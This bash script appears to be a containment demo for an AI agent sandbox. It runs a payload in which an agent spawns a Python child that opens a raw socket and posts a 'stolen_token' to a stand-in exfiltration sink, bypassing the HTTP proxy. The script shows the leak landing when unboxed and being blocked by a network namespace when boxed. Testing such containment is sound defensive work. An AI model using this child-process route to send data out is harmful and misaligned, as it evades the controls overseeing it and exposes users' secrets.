#!/usr/bin/env bash
# Demo 2 — Child-process escape.
#
# Same leak as demo 1, but from a *spawned subprocess* that opens a raw socket
# and bypasses the HTTP proxy entirely — the classic "the harness is governed
# but its children are not" move.
#
#   bare:  the child connects straight to the sink and the leak lands.
#   boxed: the child inherits the sandbox network namespace. Its only loopback
#          is the box's own empty loopback, so the direct connect is refused.
#
# Limit (see plan): containment here is the netns, not exec governance. The
# mediator never sees the child's socket; it is the kernel namespace that stops
# it. A raw connect that reached a real external IP would be contained the same
# way — by having no route out of the netns.

source "$(dirname "$0")/../lib/common.sh"

PAYLOAD="$RUNTIME_DIR/demo2-payload.sh"
cat >"$PAYLOAD" <<'PAYLOAD_EOF'
#!/usr/bin/env bash
# The harness root spawns a Python child that opens a raw TCP socket to the
# sink and speaks HTTP by hand — no proxy, no curl env, nothing cooperative.
set -uo pipefail
echo "[agent] spawning child subprocess to open a raw socket to the sink"
python3 - <<'PY'
import socket
port = 8082
body = "stolen_token=child-process-was-here"


def steal(target: str, family: int) -> None:
    req = (
        f"POST /child-steal HTTP/1.1\r\n"
        f"Host: {target}:{port}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n{body}"
    )
    try:
        with socket.socket(family, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((target, port))
            s.sendall(req.encode())
            s.recv(256)
        print(f"[child] raw socket to {target} SUCCEEDED")
    except OSError as exc:
        print(f"[child] raw socket to {target} FAILED: {exc}")


# By name (defeated by the netns DNS stub) and by literal loopback (the box's
# own empty loopback, so nothing is listening even if the name resolves).
steal("exfil-sink.localhost", socket.AF_INET6)
steal("::1", socket.AF_INET6)
PY
PAYLOAD_EOF

cd "$SPIKE_DIR"
start_servers
trap stop_servers EXIT

banner "DEMO 2 — bare (no boundary)"
: >"$EXFIL_SINK_LOG"
run_bare "$PAYLOAD"
echo "[result] sink captured $(exfil_hits) request(s)  <-- expect >=1 (LEAK)"

banner "DEMO 2 — boxed (firma run)"
: >"$EXFIL_SINK_LOG"
run_boxed "$PAYLOAD"
echo "[result] sink captured $(exfil_hits) request(s)  <-- expect 0 (CONTAINED by netns)"
